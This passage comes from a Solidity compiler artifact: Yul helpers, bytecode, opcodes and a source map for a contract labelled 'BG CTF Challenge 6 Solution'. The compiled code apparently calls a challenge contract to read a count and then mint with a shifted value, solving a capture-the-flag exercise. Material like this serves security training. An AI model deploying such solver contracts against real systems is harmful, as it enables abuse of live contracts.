loopEnd := and(newLen, not(0x1f))\n\n            let dstPtr := array_dataslot_t_string_storage(slot)\n            let i := 0\n            for { } lt(i, loopEnd) { i := add(i, 0x20) } {\n                sstore(dstPtr, mload(add(src, srcOffset)))\n                dstPtr := add(dstPtr, 1)\n                srcOffset := add(srcOffset, 32)\n            }\n            if lt(loopEnd, newLen) {\n                let lastValue := mload(add(src, srcOffset))\n                sstore(dstPtr, mask_bytes_dynamic(lastValue, and(newLen, 0x1f)))\n            }\n            sstore(slot, add(mul(newLen, 2), 1))\n        }\n        default {\n            let value := 0\n            if newLen {\n                value := mload(add(src, srcOffset))\n            }\n            sstore(slot, extract_used_part_and_set_length_of_short_byte_array(value, newLen))\n        }\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"608060405234801561001057600080fd5b5060405161095638038061095683398181016040528101906100329190610120565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506040518060400160405280601b81526020017f424720435446204368616c6c656e6765203620536f6c7574696f6e0000000000815250600190816100b6919061039d565b505061046f565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ed826100c2565b9050919050565b6100fd816100e2565b811461010857600080fd5b50565b60008151905061011a816100f4565b92915050565b600060208284031215610136576101356100bd565b5b60006101448482850161010b565b91505092915050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806101ce57607f821691505b6020821081036101e1576101e0610187565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b6000600883026102497fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8261020c565b610253868361020c565b95508019841693508086168417925050509392505050565b6000819050919050565b6000819050919050565b600061029a6102956102908461026b565b610275565b61026b565b9050919050565b6000819050919050565b6102b48361027f565b6102c86102c0826102a1565b848454610219565b825550505050565b600090565b6102dd6102d0565b6102e88184846102ab565b505050565b5b8181101561030c576103016000826102d5565b6001810190506102ee565b5050565b601f82111561035157610322816101e7565b61032b846101fc565b8101602085101561033a578190505b61034e610346856101fc565b8301826102ed565b50505b505050565b600082821c905092915050565b600061037460001984600802610356565b1980831691505092915050565b600061038d8383610363565b9150826002028217905092915050565b6103a68261014d565b67ffffffffffffffff8111156103bf576103be610158565b5b6103c982546101b6565b6103d4828285610310565b600060209050601f83116001811461040757600084156103f5578287015190505b6103ff8582610381565b865550610467565b601f198416610415866101e7565b60005b8281101561043d57848901518255600182019150602085019450602081019050610418565b8683101561045a5784890151610456601f891682610363565b8355505b6001600288020188555050505b505050505050565b6104d88061047e6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806306fdde03146100465780632be0956114610064578063d2ef73981461006e575b600080fd5b61004e61008c565b60405161005b91906102f4565b60405180910390f35b61006c61011a565b005b610076610240565b6040516100839190610395565b60405180910390f35b60018054610099906103df565b80601f01602080910402602001604051908101604052809291908181526020018280546100c5906103df565b80156101125780601f106100e757610100808354040283529160200191610112565b820191906000526020600020905b8154815290600101906020018083116100f557829003601f168201915b505050505081565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166306661abd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610188573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101ac919061044b565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323df6bd6600883901b6040518263ffffffff1660e01b815260040161020b9190610487565b600060405180830381600087803b15801561022557600080fd5b505af1158015610239573d6000803e3d6000fd5b5050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600081519050919050565b600082825260208201905092915050565b60005b8381101561029e578082015181840152602081019050610283565b60008484015250505050565b6000601f19601f8301169050919050565b60006102c682610264565b6102d0818561026f565b93506102e0818560208601610280565b6102e9816102aa565b840191505092915050565b6000602082019050818103600083015261030e81846102bb565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061035b61035661035184610316565b610336565b610316565b9050919050565b600061036d82610340565b9050919050565b600061037f82610362565b9050919050565b61038f81610374565b82525050565b60006020820190506103aa6000830184610386565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806103f757607f821691505b60208210810361040a576104096103b0565b5b50919050565b600080fd5b6000819050919050565b61042881610415565b811461043357600080fd5b50565b6000815190506104458161041f565b92915050565b60006020828403121561046157610460610410565b5b600061046f84828501610436565b91505092915050565b61048181610415565b82525050565b600060208201905061049c6000830184610478565b9291505056fea26469706673582212208818aaa7c5f70c7f703fe2e0924d9053ad8a8888c622e709885ac5a6a8acfb4e64736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x956 CODESIZE SUB DUP1 PUSH2 0x956 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x120 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1B DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x424720435446204368616C6C656E6765203620536F6C7574696F6E0000000000 DUP2 MSTORE POP PUSH1 0x1 SWAP1 DUP2 PUSH2 0xB6 SWAP2 SWAP1 PUSH2 0x39D JUMP JUMPDEST POP POP PUSH2 0x46F JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xED DUP3 PUSH2 0xC2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xFD DUP2 PUSH2 0xE2 JUMP JUMPDEST DUP2 EQ PUSH2 0x108 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x11A DUP2 PUSH2 0xF4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x136 JUMPI PUSH2 0x135 PUSH2 0xBD JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x144 DUP5 DUP3 DUP6 ADD PUSH2 0x10B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x1CE JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x1E1 JUMPI PUSH2 0x1E0 PUSH2 0x187 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP2 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x8 DUP4 MUL PUSH2 0x249 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH2 0x20C JUMP JUMPDEST PUSH2 0x253 DUP7 DUP4 PUSH2 0x20C JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x29A PUSH2 0x295 PUSH2 0x290 DUP5 PUSH2 0x26B JUMP JUMPDEST PUSH2 0x275 JUMP JUMPDEST PUSH2 0x26B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2B4 DUP4 PUSH2 0x27F JUMP JUMPDEST PUSH2 0x2C8 PUSH2 0x2C0 DUP3 PUSH2 0x2A1 JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH2 0x219 JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SWAP1 JUMP JUMPDEST PUSH2 0x2DD PUSH2 0x2D0 JUMP JUMPDEST PUSH2 0x2E8 DUP2 DUP5 DUP5 PUSH2 0x2AB JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x30C JUMPI PUSH2 0x301 PUSH1 0x0 DUP3 PUSH2 0x2D5 JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x2EE JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH2 0x351 JUMPI PUSH2 0x322 DUP2 PUSH2 0x1E7 JUMP JUMPDEST PUSH2 0x32B DUP5 PUSH2 0x1FC JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH2 0x33A JUMPI DUP2 SWAP1 POP JUMPDEST PUSH2 0x34E PUSH2 0x346 DUP6 PUSH2 0x1FC JUMP JUMPDEST DUP4 ADD DUP3 PUSH2 0x2ED JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x374 PUSH1 0x0 NOT DUP5 PUSH1 0x8 MUL PUSH2 0x356 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x38D DUP4 DUP4 PUSH2 0x363 JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3A6 DUP3 PUSH2 0x14D JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x3BF JUMPI PUSH2 0x3BE PUSH2 0x158 JUMP JUMPDEST JUMPDEST PUSH2 0x3C9 DUP3 SLOAD PUSH2 0x1B6 JUMP JUMPDEST PUSH2 0x3D4 DUP3 DUP3 DUP6 PUSH2 0x310 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH2 0x407 JUMPI PUSH1 0x0 DUP5 ISZERO PUSH2 0x3F5 JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH2 0x3FF DUP6 DUP3 PUSH2 0x381 JUMP JUMPDEST DUP7 SSTORE POP PUSH2 0x467 JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH2 0x415 DUP7 PUSH2 0x1E7 JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH2 0x43D JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x418 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH2 0x45A JUMPI DUP5 DUP10 ADD MLOAD PUSH2 0x456 PUSH1 0x1F DUP10 AND DUP3 PUSH2 0x363 JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH2 0x4D8 DUP1 PUSH2 0x47E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x2BE09561 EQ PUSH2 0x64 JUMPI DUP1 PUSH4 0xD2EF7398 EQ PUSH2 0x6E JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x8C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5B SWAP2 SWAP1 PUSH2 0x2F4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x6C PUSH2 0x11A JUMP JUMPDEST STOP JUMPDEST PUSH2 0x76 PUSH2 0x240 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x83 SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH2 0x99 SWAP1 PUSH2 0x3DF JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0xC5 SWAP1 PUSH2 0x3DF JUMP JUMPDEST DUP1 ISZERO PUSH2 0x112 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0xE7 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x112 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0xF5 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x6661ABD PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x188 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1AC SWAP2 SWAP1 PUSH2 0x44B JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23DF6BD6 PUSH1 0x8 DUP4 SWAP1 SHL PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x20B SWAP2 SWAP1 PUSH2 0x487 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x225 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x239 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x29E JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x283 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2C6 DUP3 PUSH2 0x264 JUMP JUMPDEST PUSH2 0x2D0 DUP2 DUP6 PUSH2 0x26F JUMP JUMPDEST SWAP4 POP PUSH2 0x2E0 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x280 JUMP JUMPDEST PUSH2 0x2E9 DUP2 PUSH2 0x2AA JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x30E DUP2 DUP5 PUSH2 0x2BB JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x35B PUSH2 0x356 PUSH2 0x351 DUP5 PUSH2 0x316 JUMP JUMPDEST PUSH2 0x336 JUMP JUMPDEST PUSH2 0x316 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x36D DUP3 PUSH2 0x340 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x37F DUP3 PUSH2 0x362 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x38F DUP2 PUSH2 0x374 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3AA PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x386 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x3F7 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x40A JUMPI PUSH2 0x409 PUSH2 0x3B0 JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x428 DUP2 PUSH2 0x415 JUMP JUMPDEST DUP2 EQ PUSH2 0x433 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x445 DUP2 PUSH2 0x41F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x461 JUMPI PUSH2 0x460 PUSH2 0x410 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x46F DUP5 DUP3 DUP6 ADD PUSH2 0x436 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x481 DUP2 PUSH2 0x415 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x49C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x478 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP9 XOR 0xAA 0xA7 0xC5 0xF7 0xC PUSH32 0x703FE2E0924D9053AD8A8888C622E709885AC5A6A8ACFB4E64736F6C63430008 SHR STOP CALLER ","sourceMap":"65:361:13:-:0;;;154:144;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;227:17;203:9;;:42;;;;;;;;;;;;;;;;;;255:36;;;;;;;;;;;;;;;;;:4;:36;;;;;;:::i;:::-;;154:144;65:361;;88:117:14;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;1202:99::-;1254:6;1288:5;1282:12;1272:22;;1202:99;;;:::o;1307:180::-;1355:77;1352:1;1345:88;1452:4;1449:1;1442:15;1476:4;1473:1;1466:15;1493:180;1541:77;1538:1;1531:88;1638:4;1635:1;1628:15;1662:4;1659:1;1652:15;1679:320;1723:6;1760:1;1754:4;1750:12;1740:22;;1807:1;1801:4;1797:12;1828:18;1818:81;;1884:4;1876:6;1872:17;1862:27;;1818:81;1946:2;1938:6;1935:14;1915:18;1912:38;1909:84;;1965:18;;:::i;:::-;1909:84;1730:269;1679:320;;;:::o;2005:141::-;2054:4;2077:3;2069:11;;2100:3;2097:1;2090:14;2134:4;2131:1;2121:18;2113:26;;2005:141;;;:::o;2152:93::-;2189:6;2236:2;2231;2224:5;2220:14;2216:23;2206:33;;2152:93;;;:::o;2251:107::-;2295:8;2345:5;2339:4;2335:16;2314:37;;2251:107;;;;:::o;2364:393::-;2433:6;2483:1;2471:10;2467:18;2506:97;2536:66;2525:9;2506:97;:::i;:::-;2624:39;2654:8;2643:9;2624:39;:::i;:::-;2612:51;;2696:4;2692:9;2685:5;2681:21;2672:30;;2745:4;2735:8;2731:19;2724:5;2721:30;2711:40;;2440:317;;2364:393;;;;;:::o;2763:77::-;2800:7;2829:5;2818:16;;2763:77;;;:::o;2846:60::-;2874:3;2895:5;2888:12;;2846:60;;;:::o;2912:142::-;2962:9;2995:53;3013:34;3022:24;3040:5;3022:24;:::i;:::-;3013:34;:::i;:::-;2995:53;:::i;:::-;2982:66;;2912:142;;;:::o;3060:75::-;3103:3;3124:5;3117:12;;3060:75;;;:::o;3141:269::-;3251:39;3282:7;3251:39;:::i;:::-;3312:91;3361:41;3385:16;3361:41;:::i;:::-;3353:6;3346:4;3340:11;3312:91;:::i;:::-;3306:4;3299:105;3217:193;3141:269;;;:::o;3416:73::-;3461:3;3416:73;:::o;3495:189::-;3572:32;;:::i;:::-;3613:65;3671:6;3663;3657:4;3613:65;:::i;:::-;3548:136;3495:189;;:::o;3690:186::-;3750:120;3767:3;3760:5;3757:14;3750:120;;;3821:39;3858:1;3851:5;3821:39;:::i;:::-;3794:1;3787:5;3783:13;3774:22;;3750:120;;;3690:186;;:::o;3882:543::-;3983:2;3978:3;3975:11;3972:446;;;4017:38;4049:5;4017:38;:::i;:::-;4101:29;4119:10;4101:29;:::i;:::-;4091:8;4087:44;4284:2;4272:10;4269:18;4266:49;;;4305:8;4290:23;;4266:49;4328:80;4384:22;4402:3;4384:22;:::i;:::-;4374:8;4370:37;4357:11;4328:80;:::i;:::-;3987:431;;3972:446;3882:543;;;:::o;4431:117::-;4485:8;4535:5;4529:4;4525:16;4504:37;;4431:117;;;;:::o;4554:169::-;4598:6;4631:51;4679:1;4675:6;4667:5;4664:1;4660:13;4631:51;:::i;:::-;4627:56;4712:4;4706;4702:15;4692:25;;4605:118;4554:169;;;;:::o;4728:295::-;4804:4;4950:29;4975:3;4969:4;4950:29;:::i;:::-;4942:37;;5012:3;5009:1;5005:11;4999:4;4996:21;4988:29;;4728:295;;;;:::o;5028:1395::-;5145:37;5178:3;5145:37;:::i;:::-;5247:18;5239:6;5236:30;5233:56;;;5269:18;;:::i;:::-;5233:56;5313:38;5345:4;5339:11;5313:38;:::i;:::-;5398:67;5458:6;5450;5444:4;5398:67;:::i;:::-;5492:1;5516:4;5503:17;;5548:2;5540:6;5537:14;5565:1;5560:618;;;;6222:1;6239:6;6236:77;;;6288:9;6283:3;6279:19;6273:26;6264:35;;6236:77;6339:67;6399:6;6392:5;6339:67;:::i;:::-;6333:4;6326:81;6195:222;5530:887;;5560:618;5612:4;5608:9;5600:6;5596:22;5646:37;5678:4;5646:37;:::i;:::-;5705:1;5719:208;5733:7;5730:1;5727:14;5719:208;;;5812:9;5807:3;5803:19;5797:26;5789:6;5782:42;5863:1;5855:6;5851:14;5841:24;;5910:2;5899:9;5895:18;5882:31;;5756:4;5753:1;5749:12;5744:17;;5719:208;;;5955:6;5946:7;5943:19;5940:179;;;6013:9;6008:3;6004:19;5998:26;6056:48;6098:4;6090:6;6086:17;6075:9;6056:48;:::i;:::-;6048:6;6041:64;5963:156;5940:179;6165:1;6161;6153:6;6149:14;6145:22;6139:4;6132:36;5567:611;;;5530:887;;5120:1303;;;5028:1395;;:::o;65:361:13:-;;;;;;;"},"deployedBytecode":{"functionDebugData":{"@challenge_5776":{"entryPoint":576,"id":5776,"parameterSlots":0,"returnSlots":0},"@name_5778":{"entryPoint":140,"id":5778,"parameterSlots":0,"returnSlots":0},"@startMint_5812":{"entryPoint":282,"id":5812,"parameterSlots":0,"returnSlots":0},"abi_decode_t_uint256_fromMemory":{"entryPoint":1078,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_uint256_fromMemory":{"entryPoint":1099,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_contract$_IChallenge6_$5824_to_t_address_fromStack":{"entryPoint":902,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack":{"entryPoint":699,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":1144,"id":null,"parameterSlots":2,"returnSlots":0},"abi_en